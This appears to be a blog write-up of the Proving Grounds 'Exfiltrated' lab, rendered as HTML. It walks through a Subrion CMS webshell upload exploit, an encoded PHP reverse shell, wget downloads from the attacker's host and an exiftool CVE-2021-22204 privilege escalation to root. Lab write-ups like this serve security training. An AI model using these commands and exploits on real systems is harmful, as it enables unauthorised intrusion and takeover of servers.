+    style="padding-bottom: 46.875%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABCUlEQVR42pWN3WqDUBCEz8P4F4wPoGLUqCCJ5Db+gE+lydO1uQghlzHSCymSaXepcGjSpj3wwc7Mzh6BJ28cR1y6DpfrFbfb7dk6xND36F5f0B0O6I9HvJ3Pd/SnE/Mok3kfBgj84df/PNG0Ldrd7nf2+x+zRp6bBkLXNBiGAU1VoSgKo+s6e6rkkZ7NZpyRr332SBPUVb8Qy+USm80G6/UaWZYhDEMkScLearVCmqYIgoBn2iHIoz3Zozu2bUMsFgs+QMRxDNd1+QBpKvm+D8/zEEUR+5N2HAfUnaAeH5zP55CxLIv57pumebcn70+IPM9RVRXKsmRoljXl2+32IZRNnbquURQFPgCrjsxwkz4fNgAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
+  ></span>
+  <picture>
+          <source
+              srcset="/static/10e7478273815a2c9ee9f4d6ae60ece3/a59e9/2.webp 192w,
+/static/10e7478273815a2c9ee9f4d6ae60ece3/0ca9f/2.webp 384w,
+/static/10e7478273815a2c9ee9f4d6ae60ece3/dc9b9/2.webp 768w,
+/static/10e7478273815a2c9ee9f4d6ae60ece3/e2c2f/2.webp 1152w,
+/static/10e7478273815a2c9ee9f4d6ae60ece3/e14cd/2.webp 1233w"
+              sizes="(max-width: 768px) 100vw, 768px"
+              type="image/webp"
+            />
+          <source
+            srcset="/static/10e7478273815a2c9ee9f4d6ae60ece3/3b721/2.png 192w,
+/static/10e7478273815a2c9ee9f4d6ae60ece3/66595/2.png 384w,
+/static/10e7478273815a2c9ee9f4d6ae60ece3/fe486/2.png 768w,
+/static/10e7478273815a2c9ee9f4d6ae60ece3/d2d74/2.png 1152w,
+/static/10e7478273815a2c9ee9f4d6ae60ece3/7644a/2.png 1233w"
+            sizes="(max-width: 768px) 100vw, 768px"
+            type="image/png"
+          />
+          <img
+            class="gatsby-resp-image-image"
+            src="/static/10e7478273815a2c9ee9f4d6ae60ece3/fe486/2.png"
+            alt="image"
+            title=""
+            loading="lazy"
+            decoding="async"
+            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+          />
+        </picture>
+  </a>
+    </span></p>
+<p>It is impossible to do subdirectory enumeration since this is sso application. Let’s continue with vhost enumeration.</p>
+<p>there was /login endpoint, and I could log in with admin:admin</p>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 768px; "
+    >
+      <a
+    class="gatsby-resp-image-link"
+    href="/static/8b57179873fe924c46fb7461990b7b20/b989c/3.png"
+    style="display: block"
+    target="_blank"
+    rel="noopener"
+  >
+    <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 61.979166666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA/ElEQVR42q1Ty2rDMBDU/39Xr731VGyCSxxcEluKo/drsusk0B7ilroDg3YRGo12V0LJEU3TQEqJUgrWUGtFCAHee8QYkXOGtXaJH7kIMSBQUijhA8/Il63tPygy3RxTWtS/CdzJ8VeHa2QI/AB+yul4hJwm/AaCnXFNlFIwxiCR208d0Iwau8ngQzn0s194uMRVplJvgsMwoG1bdF0H5yx8LrjEAk00RJvqQnPPn5H0INgRd3jWBlJJEnTYAhGpy2etcZgNRhJ1NAabBPnJXHgeHU8zxvFmQW4Gr/8BwY72fQ9N9XvTBe/29lvqXwX5B/BgAwUvMuF1zpsEr6SzsZDgIln4AAAAAElFTkSuQmCC'); background-size: cover; display: block;"
+  ></span>
+  <picture>
+          <source
+              srcset="/static/8b57179873fe924c46fb7461990b7b20/a59e9/3.webp 192w,
+/static/8b57179873fe924c46fb7461990b7b20/0ca9f/3.webp 384w,
+/static/8b57179873fe924c46fb7461990b7b20/dc9b9/3.webp 768w,
+/static/8b57179873fe924c46fb7461990b7b20/e2c2f/3.webp 1152w,
+/static/8b57179873fe924c46fb7461990b7b20/477d4/3.webp 1224w"
+              sizes="(max-width: 768px) 100vw, 768px"
+              type="image/webp"
+            />
+          <source
+            srcset="/static/8b57179873fe924c46fb7461990b7b20/3b721/3.png 192w,
+/static/8b57179873fe924c46fb7461990b7b20/66595/3.png 384w,
+/static/8b57179873fe924c46fb7461990b7b20/fe486/3.png 768w,
+/static/8b57179873fe924c46fb7461990b7b20/d2d74/3.png 1152w,
+/static/8b57179873fe924c46fb7461990b7b20/b989c/3.png 1224w"
+            sizes="(max-width: 768px) 100vw, 768px"
+            type="image/png"
+          />
+          <img
+            class="gatsby-resp-image-image"
+            src="/static/8b57179873fe924c46fb7461990b7b20/fe486/3.png"
+            alt="image"
+            title=""
+            loading="lazy"
+            decoding="async"
+            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+          />
+        </picture>
+  </a>
+    </span></p>
+<p>And we have this page
+<span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 768px; "
+    >
+      <a
+    class="gatsby-resp-image-link"
+    href="/static/87978fbf150052472071803dc81553ac/19afb/4.png"
+    style="display: block"
+    target="_blank"
+    rel="noopener"
+  >
+    <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 69.79166666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAYAAAAvxDzwAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABlklEQVR42o2T607CQBCFeSMNIDGgiL/Ux9U3QP9ACwVa1MQQg9xKSgLSlu29x9mm5VrASb7Msi1nz8xOM6XyAyqVR1Tun3BdrCB3dYv81Q3yhTJyhTtkKV9kiztc5ohsDF/nShH8WaajfECo1fBWfYVYF6DICuSODFnuot3potWW0ZTaa8RGC4LQQF2UIDbbqNNaEBu03yQkZEChmzp+phoWzIYVAj7tBUGAMAyxH3yPE/C89TuBBEPMmYdPzcT3nOFrZkAzHTi2DZvwPO8A3/fhb6+JZB055G5MwwBjbO3KjgWR4oK/n0bsEHBdF4PBAMPhEOPxGI7jwDTN6ACeDTosyavVCrquY7lcRq74fxN2BCeTCUajETRNi07bLmW/3ETgpMN+v49erwdVVY9eyLlYC0Y9pJI4vFycuOVTYmvBtHBc3h8v9ZbTSFpwVNCzGALXpp5t+nnsdg96uGM9zu8LBmVhUe2bGft3D7cjiBWfpwwvKiOrDqx4Jk9hWdZmsA8dhqjOGCT6ahxDxy/NnX4GPpe8j38z1hLUnqd+VAAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
+  ></span>
+  <picture>
+          <source
+              srcset="/static/87978fbf150052472071803dc81553ac/a59e9/4.webp 192w,
+/static/87978fbf150052472071803dc81553ac/0ca9f/4.webp 384w,
+/static/87978fbf150052472071803dc81553ac/dc9b9/4.webp 768w,
+/static/87978fbf150052472071803dc81553ac/e2c2f/4.webp 1152w,
+/static/87978fbf150052472071803dc81553ac/7e666/4.webp 1287w"
+              sizes="(max-width: 768px) 100vw, 768px"
+              type="image/webp"
+            />
+          <source
+            srcset="/static/87978fbf150052472071803dc81553ac/3b721/4.png 192w,
+/static/87978fbf150052472071803dc81553ac/66595/4.png 384w,
+/static/87978fbf150052472071803dc81553ac/fe486/4.png 768w,
+/static/87978fbf150052472071803dc81553ac/d2d74/4.png 1152w,
+/static/87978fbf150052472071803dc81553ac/19afb/4.png 1287w"
+            sizes="(max-width: 768px) 100vw, 768px"
+            type="image/png"
+          />
+          <img
+            class="gatsby-resp-image-image"
+            src="/static/87978fbf150052472071803dc81553ac/fe486/4.png"
+            alt="image"
+            title=""
+            loading="lazy"
+            decoding="async"
+            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+          />
+        </picture>
+  </a>
+    </span></p>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 768px; "
+    >
+      <a
+    class="gatsby-resp-image-link"
+    href="/static/a3755bb51b0692394a13e932a6fd3803/f27d8/5.png"
+    style="display: block"
+    target="_blank"
+    rel="noopener"
+  >
+    <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 36.45833333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAf0lEQVR42q2QQQ7CMAwE8/9X0V+UJyCkiAjZieM429pw4gS0llb2aTTeJCKotWLOiTMm9d7RWoOZBfRoksOY+Tygw4godI/CXCp5fzlnjDFePX4Gf7xcSgm6Q5sapFvs9t5mPxiq6t5hxVDB7f7EshKWK+8hXOImPHiEqX1huAFNgSiN6U36XwAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
+  ></span>
+  <picture>
+          <source
+              srcset="/static/a3755bb51b0692394a13e932a6fd3803/a59e9/5.webp 192w,
+/static/a3755bb51b0692394a13e932a6fd3803/0ca9f/5.webp 384w,
+/static/a3755bb51b0692394a13e932a6fd3803/dc9b9/5.webp 768w,
+/static/a3755bb51b0692394a13e932a6fd3803/ec48d/5.webp 847w"
+              sizes="(max-width: 768px) 100vw, 768px"
+              type="image/webp"
+            />
+          <source
+            srcset="/static/a3755bb51b0692394a13e932a6fd3803/3b721/5.png 192w,
+/static/a3755bb51b0692394a13e932a6fd3803/66595/5.png 384w,
+/static/a3755bb51b0692394a13e932a6fd3803/fe486/5.png 768w,
+/static/a3755bb51b0692394a13e932a6fd3803/f27d8/5.png 847w"
+            sizes="(max-width: 768px) 100vw, 768px"
+            type="image/png"
+          />
+          <img
+            class="gatsby-resp-image-image"
+            src="/static/a3755bb51b0692394a13e932a6fd3803/fe486/5.png"
+            alt="image"
+            title=""
+            loading="lazy"
+            decoding="async"
+            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+          />
+        </picture>
+  </a>
+    </span></p>
+<p>Time to search for cve</p>
+<div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">┌──(hosan㉿kali)-[~/pg/exfiltrated]
+└─$ searchsploit subrion  
+------------------------------------------ ---------------------------------
+Subrion 3.x - Multiple Vulnerabilities                                                        | php/webapps/38525.txt
+Subrion 4.2.1 - 'Email' Persistant Cross-Site Scripting                                       | php/webapps/47469.txt
+Subrion Auto Classifieds - Persistent Cross-Site Scripting                                    | php/webapps/14391.txt
+SUBRION CMS - Multiple Vulnerabilities                                                        | php/webapps/17390.txt
+Subrion CMS 2.2.1 - Cross-Site Request Forgery (Add Admin)                                    | php/webapps/21267.txt
+subrion CMS 2.2.1 - Multiple Vulnerabilities                                                  | php/webapps/22159.txt
+Subrion CMS 4.0.5 - Cross-Site Request Forgery (Add Admin)                                    | php/webapps/47851.txt
+Subrion CMS 4.0.5 - Cross-Site Request Forgery Bypass / Persistent Cross-Site Scripting       | php/webapps/40553.txt
+Subrion CMS 4.0.5 - SQL Injection                                                             | php/webapps/40202.txt
+Subrion CMS 4.2.1 - 'avatar[path]' XSS                                                        | php/webapps/49346.txt
+Subrion CMS 4.2.1 - Arbitrary File Upload                                                     | php/webapps/49876.py
+Subrion CMS 4.2.1 - Cross Site Request Forgery (CSRF) (Add Amin)                              | php/webapps/50737.txt
+Subrion CMS 4.2.1 - Cross-Site Scripting                                                      | php/webapps/45150.txt
+Subrion CMS 4.2.1 - Stored Cross-Site Scripting (XSS)                                         | php/webapps/51110.txt
+---------------------------------------------------------------------------------------------- ---------------------------------</code></pre></div>
+<p>So there is File Upload vuln, maybe we can use it.</p>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 768px; "
+    >
+      <a
+    class="gatsby-resp-image-link"
+    href="/static/5fa8aef63c113db442236aa581fa3ce2/4bff0/6.png"
+    style="display: block"
+    target="_blank"
+    rel="noopener"
+  >
+    <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 56.25%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABvUlEQVR42p2R30tTYRjHz18QdGNz89emm7km2kkZCquLmRSRsIs5uyioiyDopiuhKyHSiWgXLYruBZH+hSDoIoKUILyQTTTHcuecuc7OPDuSRz++R8XSi/D4wIfn/fK+fN735ZEGBu8QvzlEPH6b6zduERtKEHtwn757I0RHhukdTtKTSiEnk3QlEv+lWyCF2i8TCEYIdnTjqWsm9XyU16vfmVn6Qia7wJucwyIZ0Z2cyX476qfX4lx2EcnjbSEckYkP3qVL7uPd2/fYVQNLL8POH3ZrFrZpsWPWsGtOP8R28vH6L5KvJUhPNMaTp894+Ogxs3Mf+PxDZf7TCh8XfrJWUFG0EqqmoZVKbJTKFEVWRFacrIr9f5Da5aj47lVCYZkLF+sZe5Emt2HydanA8vomummzu8eZS2psDtIa6hTf7cfjCzAxOU25us1KXuGX9hu3JfmaAmIoVwh39nLJ62dcCNWKxfJakbxSZs+tsKGpFX9bmI7ItUNh2hFuC6EihOd5YeNJ4cv0FOqmTm41z3qhiK7rrhBTbjsW1tX7mZyaObjJqFQwt7YwDMMVkrfBf0r46kBYFbKaZWG5ZB+vPrSP3gAtjQAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
+  ></span>
+  <picture>
+          <source
+              srcset="/static/5fa8aef63c113db442236aa581fa3ce2/a59e9/6.webp 192w,
+/static/5fa8aef63c113db442236aa581fa3ce2/0ca9f/6.webp 384w,
+/static/5fa8aef63c113db442236aa581fa3ce2/dc9b9/6.webp 768w,
+/static/5fa8aef63c113db442236aa581fa3ce2/e2c2f/6.webp 1152w,
+/static/5fa8aef63c113db442236aa581fa3ce2/f3efb/6.webp 1536w,
+/static/5fa8aef63c113db442236aa581fa3ce2/23703/6.webp 1581w"
+              sizes="(max-width: 768px) 100vw, 768px"
+              type="image/webp"
+            />
+          <source
+            srcset="/static/5fa8aef63c113db442236aa581fa3ce2/3b721/6.png 192w,
+/static/5fa8aef63c113db442236aa581fa3ce2/66595/6.png 384w,
+/static/5fa8aef63c113db442236aa581fa3ce2/fe486/6.png 768w,
+/static/5fa8aef63c113db442236aa581fa3ce2/d2d74/6.png 1152w,
+/static/5fa8aef63c113db442236aa581fa3ce2/e8464/6.png 1536w,
+/static/5fa8aef63c113db442236aa581fa3ce2/4bff0/6.png 1581w"
+            sizes="(max-width: 768px) 100vw, 768px"
+            type="image/png"
+          />
+          <img
+            class="gatsby-resp-image-image"
+            src="/static/5fa8aef63c113db442236aa581fa3ce2/fe486/6.png"
+            alt="image"
+            title=""
+            loading="lazy"
+            decoding="async"
+            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+          />
+        </picture>
+  </a>
+    </span></p>
+<p>After reading and visiting the site here, indeed, this is version 4.2.1 which should be vulnerable.</p>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 768px; "
+    >
+      <a
+    class="gatsby-resp-image-link"
+    href="/static/7b8fc502ff1fe0b8586b9aca0a82f648/e3807/7.png"
+    style="display: block"
+    target="_blank"
+    rel="noopener"
+  >
+    <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 23.958333333333336%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA0ElEQVR42m2P207DMBBE8/+/xCcg9QUhXioQzcWN7cbr+BoJe7oOUKHStY5mPTMv2w3DCEsrctqQYv5HjOnGfZYZFyLkujIO5D26Xr9DuzMu/jE2SLioYMIMfZdpL3ZPOQHJLF6hO5kJp2XEJ9P2nhpi90Y643k+4ml4xYv8wNT8n3ywgnN52/sG97t2ymUxiCljlgrOB6S87f/MKp3jMmEyGmYlEFlIqaEWjTdxwMxKfK5UGsIadOCpteKvPpr6+7hTS0GpX9hKYC3fHkM54grS834ST+wFTAAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
+  ></span>
+  <picture>
+          <source
+              srcset="/static/7b8fc502ff1fe0b8586b9aca0a82f648/a59e9/7.webp 192w,
+/static/7b8fc502ff1fe0b8586b9aca0a82f648/0ca9f/7.webp 384w,
+/static/7b8fc502ff1fe0b8586b9aca0a82f648/dc9b9/7.webp 768w,
+/static/7b8fc502ff1fe0b8586b9aca0a82f648/e2c2f/7.webp 1152w,
+/static/7b8fc502ff1fe0b8586b9aca0a82f648/90a49/7.webp 1517w"
+              sizes="(max-width: 768px) 100vw, 768px"
+              type="image/webp"
+            />
+          <source
+            srcset="/static/7b8fc502ff1fe0b8586b9aca0a82f648/3b721/7.png 192w,
+/static/7b8fc502ff1fe0b8586b9aca0a82f648/66595/7.png 384w,
+/static/7b8fc502ff1fe0b8586b9aca0a82f648/fe486/7.png 768w,
+/static/7b8fc502ff1fe0b8586b9aca0a82f648/d2d74/7.png 1152w,
+/static/7b8fc502ff1fe0b8586b9aca0a82f648/e3807/7.png 1517w"
+            sizes="(max-width: 768px) 100vw, 768px"
+            type="image/png"
+          />
+          <img
+            class="gatsby-resp-image-image"
+            src="/static/7b8fc502ff1fe0b8586b9aca0a82f648/fe486/7.png"
+            alt="image"
+            title=""
+            loading="lazy"
+            decoding="async"
+            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+          />
+        </picture>
+  </a>
+    </span></p>
+<p>So I added the member with admin:admin (to be sure) then executed the cve</p>
+<div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">┌──(hosan㉿kali)-[~/pg/exfiltrated/CVE-2018-19422-SubrionCMS-RCE]
+└─$ python3 SubrionRCE.py -u http://exfiltrated.offsec/panel/ -l admin -p admin
+[+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422 
+
+[+] Trying to connect to: http://exfiltrated.offsec/panel/
+[+] Success!
+[+] Got CSRF token: c1MUFsfy6KZ6qep36fZitvhrocirAdSW8mf8fOcL
+[+] Trying to log in...
+[+] Login Successful!
+
+[+] Generating random name for Webshell...
+[+] Generated webshell name: qltfwzcbozjgzkw
+
+[+] Trying to Upload Webshell..
+[+] Upload Success... Webshell path: http://exfiltrated.offsec/panel/uploads/qltfwzcbozjgzkw.phar 
+
+$ ls /home
+coaran
+
+$ cat /home/coaran/local.txt
+aaaa1896196e4b2544127cb5a58e4978
+
+$ </code></pre></div>
+<p>That’s it for initial foothold</p>
+<h2>3. Privesc</h2>
+<p>Used classic method for revshell</p>
+<div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text"> echo cGhwIC1yICckc29jaz1mc29ja29wZW4oIjE5Mi4xNjguNDUuMjI0Iiw4MCk7ZXhlYygic2ggPCYzID4mMyAyPiYzIik7Jw== | base64 --decode
+--------------------------------------------
+bash -i
+bash: cannot set terminal process group (982): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@exfiltrated:/var/www/html/subrion/uploads$ 
+</code></pre></div>
+<p>Now downloaded linpeas.py</p>
+<p>Hmm nothing interesting?</p>
+<p>Downloaded pspy64</p>
+<div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">2024/09/07 19:02:01 CMD: UID=0    PID=33016  | bash /opt/image-exif.sh 
+2024/09/07 19:02:01 CMD: UID=0    PID=33015  | bash /opt/image-exif.sh 
+2024/09/07 19:02:01 CMD: UID=0    PID=33014  | /bin/sh -c bash /opt/image-exif.sh 
+2024/09/07 19:02:01 CMD: UID=0    PID=33013  | /usr/sbin/CRON -f </code></pre></div>
+<p>Interesting image-exif.sh script is there.</p>
+<div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">www-data@exfiltrated:/opt$ cat image-exif.sh
+cat image-exif.sh
+#! /bin/bash
+#07/06/18 A BASH script to collect EXIF metadata 
+
+echo -ne "\\n metadata directory cleaned! \\n\\n"
+
+
+IMAGES='/var/www/html/subrion/uploads'
+
+META='/opt/metadata'
+FILE=`openssl rand -hex 5`
+LOGFILE="$META/$FILE"
+
+echo -ne "\\n Processing EXIF metadata now... \\n\\n"
+ls $IMAGES | grep "jpg" | while read filename; 
+do 
+    exiftool "$IMAGES/$filename" >> $LOGFILE 
+done
+
+echo -ne "\\n\\n Processing is finished! \\n\\n\\n"
+www-data@exfiltrated:/opt$ 
+</code></pre></div>
+<ol>
+<li>grep “jpg” isn’t secure enough, we can create jpg.sh</li>
+</ol>
+<div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">www-data@exfiltrated:/opt/metadata$ cat 19ffa20cf8
+cat 19ffa20cf8
+ExifTool Version Number         : 11.88
+File Name                       : jpg.sh
+Directory                       : /var/www/html/subrion/uploads
+File Size                       : 20 bytes
+File Modification Date/Time     : 2024:09:07 19:12:25+00:00
+File Access Date/Time           : 2024:09:07 19:12:25+00:00
+File Inode Change Date/Time     : 2024:09:07 19:12:25+00:00
+File Permissions                : rw-r--r--
+File Type                       : sh script
+File Type Extension             : sh
+MIME Type                       : text/x-sh
+www-data@exfiltrated:/opt/metadata$ </code></pre></div>
+<p>Okay, we are almost there.
+<span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 768px; "
+    >
+      <a
+    class="gatsby-resp-image-link"
+    href="/static/ea0a0d570fda7b078792b5507322265d/c8df6/8.png"
+    style="display: block"
+    target="_blank"
+    rel="noopener"
+  >
+    <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 48.958333333333336%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAYAAAC0VX7mAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABsklEQVR42nWPzUvcQBjG849UVBQRK95EiwothXpQ2kKpUloRRKQflx489NBDb9765xW1Wt3dZPO1k2wmM5vN1+M7k2wIVSc8ed95eOc3zxjP3nzB6u5nTK3t4cnaPqbWP2B64yNmNg8wu3WIuedHmH9xjIWXJ1h89RWL29+wtPMdT1+fYvntD6y8+4mV97+w+ukMG0e/YXQtB52eDdP20DFV9bXOr25xed3R+nvTo30Hfy7/4eK6i6tbE32Xoe+FsP1KqrdIRpqOIaWAWlJKlPTleYY4jmtPoCxKpGkKzrn2RjRXFAUeWob6CSEQBAEdLJpBQYcSQVDllXRNWUEZY0iSRM8o7x4wGfSR5TnG41TDCkpT6EQZsiyrvUrV3Jj8XO/L+qKyDpF4PRhiGEJSwoQSqSpjgZGgdHKkn6b6trTf7EVLdJ5Yhue66FsWPMeB7zoImQ8eMsTDAIIko/Bh8aqKidRsHMFwCWSZJhzbhu+5CAe+hoZsgChg4DQY1+K1/u8baDSEoQADAjHfQ9CC8TDQSRU0otr09X5S7wFveiZss4sRxZV82Ei0n9OSfMSfAO8ASkLZXd5JPZkAAAAASUVORK5CYII='); background-size: cover; display: block;"
+  ></span>
+  <picture>
+          <source
+              srcset="/static/ea0a0d570fda7b078792b5507322265d/a59e9/8.webp 192w,
+/static/ea0a0d570fda7b078792b5507322265d/0ca9f/8.webp 384w,
+/static/ea0a0d570fda7b078792b5507322265d/dc9b9/8.webp 768w,
+/static/ea0a0d570fda7b078792b5507322265d/e2c2f/8.webp 1152w,
+/static/ea0a0d570fda7b078792b5507322265d/f3efb/8.webp 1536w,
+/static/ea0a0d570fda7b078792b5507322265d/1e484/8.webp 1778w"
+              sizes="(max-width: 768px) 100vw, 768px"
+              type="image/webp"
+            />
+          <source
+            srcset="/static/ea0a0d570fda7b078792b5507322265d/3b721/8.png 192w,
+/static/ea0a0d570fda7b078792b5507322265d/66595/8.png 384w,
+/static/ea0a0d570fda7b078792b5507322265d/fe486/8.png 768w,
+/static/ea0a0d570fda7b078792b5507322265d/d2d74/8.png 1152w,
+/static/ea0a0d570fda7b078792b5507322265d/e8464/8.png 1536w,
+/static/ea0a0d570fda7b078792b5507322265d/c8df6/8.png 1778w"
+            sizes="(max-width: 768px) 100vw, 768px"
+            type="image/png"
+          />
+          <img
+            class="gatsby-resp-image-image"
+            src="/static/ea0a0d570fda7b078792b5507322265d/fe486/8.png"
+            alt="image"
+            title=""
+            loading="lazy"
+            decoding="async"
+            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+          />
+        </picture>
+  </a>
+    </span></p>
+<p>Let’s try this one.</p>
+<div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">                                                                                                                                
+┌──(hosan㉿kali)-[~/pg/exfiltrated/CVE-2021-22204-exiftool]
+└─$ python exploit.py                      
+    1 image files updated
+                                                                                                                                
+┌──(hosan㉿kali)-[~/pg/exfiltrated/CVE-2021-22204-exiftool]
+└─$ ls
+README.md  configfile  exploit.djvu  exploit.py  image.jpg  image.jpg_original  lab  payload  payload.bzz
+</code></pre></div>
+<p>So I created this malicious image.jpg file, downloaded it, and moved to /uploads folder, and waited calmly:</p>
+<div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">www-data@exfiltrated:/tmp$ wget http://192.168.45.224:8000/image.jpg
+wget http://192.168.45.224:8000/image.jpg
+--2024-09-07 19:23:54--  http://192.168.45.224:8000/image.jpg
+Connecting to 192.168.45.224:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 47571 (46K) [image/jpeg]
+Saving to: 'image.jpg'
+
+     0K .......... .......... .......... .......... ......    100%  797K=0.06s
+
+2024-09-07 19:23:54 (797 KB/s) - 'image.jpg' saved [47571/47571]
+
+www-data@exfiltrated:/tmp$ ls
+ls
+image.jpg
+jpg.sh
+linpeas.sh
+pspy64
+tmux-33
+www-data@exfiltrated:/tmp$ mv image.jpg /var/www/html/subrion/uploads/
+mv image.jpg /var/www/html/subrion/uploads/</code></pre></div>
+<div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">┌──(hosan㉿kali)-[~/pg/exfiltrated/CVE-2021-22204-exiftool]
+└─$ nc -lvnp 8000        
+listening on [any] 8000 ...
+connect to [192.168.45.224] from (UNKNOWN) [192.168.157.163] 45380
+/bin/sh: 0: can't access tty; job control turned off
+# whoami
+root
+# cat /root/proof.txt
+48fd81b4877866fad48bfa0b2987a3ef</code></pre></div>
+<p>That’s it!</p>
+<hr>
+<h2>Source</h2>
+<ul>
+<li>Proving Grounds</li>
+<li>Me!</li>
+</ul></div><style data-emotion="css 1ws88hl">.css-1ws88hl{width:50%;height:30px;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-pack:justify;-webkit-justify-content:space-between;justify-content:space-between;margin:auto;margin-bottom:50px;}@media (max-width: 768px){.css-1ws88hl{-webkit-flex-direction:row;-ms-flex-direction:row;flex-direction:row;width:50%;text-align:center;}}</style><div class="css-1ws88hl e19uf7in2"><style data-emotion="css 170jz57">.css-170jz57{margin-right:10px;z-index:2;color:black;font-size:15px;font-weight:bold;font-family:'EliceDigitalBaeum';border:0;outline:0;background-color:white;}</style><button class="css-170jz57 e19uf7in0"><style data-emotion="css 4gq8eu">.css-4gq8eu{z-index:3;}.css-4gq8eu:hover{background-image:linear-gradient(transparent 60%, #7490b5 40%);}</style><a href="https://hosahn.github.io/240906/" class="css-4gq8eu e19uf7in1">PREV POST</a></button><button class="css-170jz57 e19uf7in0"><a href="https://hosahn.github.io/240913/" class="css-4gq8eu e19uf7in1">NEXT POST</a></button></div><style data-emotion="css hx9xpc">@media (max-width: 768px){.css-hx9xpc{padding:0 20px;}}</style><div class="css-hx9xpc e1l3qcvx0"></div><div><style data-emotion="css jtgsqn">.css-jtgsqn{display:grid;place-items:center;margin-top:200px;padding:50px 0;font-size:15px;text-align:center;line-height:1.5;color:white;background-color:black;opacity:0.7;}@media (max-width: 768px){.css-jtgsqn{font-size:13px;}}</style><footer class="css-jtgsqn e1oae0v80">Thanks for visiting my blog! If you are interested in building a CTF Team, please contact me! -Hosan Lee-<br/><a target="_blank" href="https://icons8.com/icon/37287/footman"> © 2022 Hosan Lee, Munich. Footman icon by Icons8</a></footer></div></main></div><div id="gatsby-announcer" style="position:absolute;top:0;width:1px;height:1px;padding:0;overflow:hidden;clip:rect(0, 0, 0, 0);white-space:nowrap;border:0" aria-live="assertive" aria-atomic="true"></div></div><script id="gatsby-script-loader">/*<![CDATA[*/window.pagePath="/240910/";/*]]>*/</script><!-- slice-start id="_gatsby-scripts-1" -->
+          <script
+            id="gatsby-chunk-mapping"
+          >
+            window.___chunkMapping="{\"app\":[\"/app-c45422f38917e4dccc11.js\"],\"component---src-pages-404-tsx\":[\"/component---src-pages-404-tsx-c605a6a8a22697c2058a.js\"],\"component---src-pages-contact-tsx\":[\"/component---src-pages-contact-tsx-839d24c1f1f0895ec309.js\"],\"component---src-pages-index-tsx\":[\"/component---src-pages-index-tsx-a178567fdb351e751e17.js\"],\"component---src-pages-search-tsx\":[\"/component---src-pages-search-tsx-1d86b3225930aec66451.js\"],\"component---src-templates-post-template-tsx\":[\"/component---src-templates-post-template-tsx-573c131749e9ec1fc515.js\"]}";
+          </script>
+        <script>window.___webpackCompilationHash="65fa7e0c0d64dd35c62c";</script><script src="/webpack-runtime-de2ff7ae013d49969e2d.js" async></script><script src="/framework-9d608f77b5c9a88afabd.js" async></script><script src="/app-c45422f38917e4dccc11.js" async></script><!-- slice-end id="_gatsby-scripts-1" --></body></html>
